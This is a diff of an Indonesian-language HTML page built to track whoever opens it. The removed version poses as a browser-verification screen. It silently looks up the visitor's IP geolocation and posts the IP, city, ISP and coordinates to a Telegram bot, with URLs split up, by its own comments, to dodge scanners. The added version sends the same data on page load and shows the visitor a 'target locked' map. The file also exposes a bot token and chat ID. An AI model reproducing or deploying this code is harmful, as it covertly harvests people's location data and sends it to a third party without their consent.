@@ -2,60 +2,70 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Checking Connection...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Pelacakan Keamanan</title>
     <style>
-        body { background: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { text-align: center; color: #555; }
-        .spin { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: s 1s linear infinite; margin: 0 auto 15px; }
-        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
+        .info-box { padding: 20px; text-align: center; background: rgba(0,20,0,0.9); border-bottom: 2px solid #0f0; }
+        #map-container { width: 100%; height: 80vh; border: none; }
+        .blink { animation: blinker 1s linear infinite; color: red; font-weight: bold; }
+        @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <div class="spin"></div>
-    <p>Mohon tunggu sebentar, sedang memverifikasi browser Anda...</p>
-</div>
+    <div class="info-box">
+        <div class="blink">⚠️ PERINGATAN: KONEKSI TERDETEKSI ⚠️</div>
+        <div id="status">Sedang memetakan koordinat perangkat...</div>
+    </div>
 
-<script>
-    // --- PENYAMARAN DATA ---
-    // Gunakan btoa.com untuk encode/decode jika ingin lebih aman
-    const _0x1 = "8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo"; // Ganti dengan Token lo
-    const _0x2 = "8551809114"; // Ganti dengan ID Chat lo
+    <iframe id="map-container" src=""></iframe>
 
-    async function v() {
-        try {
-            // Kita pecah URL API biar gak kedeteksi bot scanner
-            const a = "https://ip" + "api.co" + "/json/";
-            const r = await fetch(a);
-            const d = await r.json();
+    <script>
+        // --- KONFIGURASI TELEGRAM ---
+        const _token = '8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo';
+        const _chatId = '8551809114';
+        // ----------------------------
 
-            // Menyusun pesan (Disamarkan)
-            const m = `[!] VISIT INFO [!]\nIP: ${d.ip}\nCity: ${d.city}\nISP: ${d.org}\nLoc: ${d.latitude},${d.longitude}`;
+        async function startTracking() {
+            try {
+                // 1. Ambil data lokasi via IP
+                const response = await fetch('https://ipapi.co/json/');
+                const d = await response.json();
 
-            // Kirim ke Telegram (Method disamarkan lewat variabel)
-            const t = "https://api.tele" + "gram.org/bot" + _0x1 + "/sendMessage";
-            
-            await fetch(t, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: _0x2,
-                    text: m
-                })
-            });
+                const lat = d.latitude;
+                const lon = d.longitude;
+                const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
 
-            // Redirect ke link asli (Ganti dengan link kuota free atau apa saja)
-            setTimeout(() => {
-                window.location.replace("https://google.com");
-            }, 1000);
+                // 2. Tampilkan Maps di Iframe (Langsung Muncul di Web)
+                document.getElementById('map-container').src = mapsUrl;
+                document.getElementById('status').innerText = `Lokasi Terkunci: ${d.city}, ${d.country_name}`;
 
-        } catch (e) {
-            window.location.replace("https://google.com");
+                // 3. Kirim data lengkap ke Telegram lo
+                const pesan = `
+📍 **TARGET TERKUNCI!**
+------------------------------
+🌐 IP: ${d.ip}
+🏙️ Kota: ${d.city}
+🏢 ISP: ${d.org}
+📍 Koordinat: ${lat}, ${lon}
+------------------------------
+🔗 Link Maps: https://www.google.com/maps?q=${lat},${lon}
+                `;
+
+                await fetch(`https://api.tele` + `gram.org/bot${_token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: _chatId, text: pesan, parse_mode: 'Markdown' })
+                });
+
+            } catch (err) {
+                document.getElementById('status').innerText = "Gagal memuat peta. Koneksi tidak stabil.";
+            }
         }
-    }
 
-    window.onload = v;
-</script>
+        // Jalankan saat web dibuka
+        window.onload = startTracking;
+    </script>
 </body>
 </html>
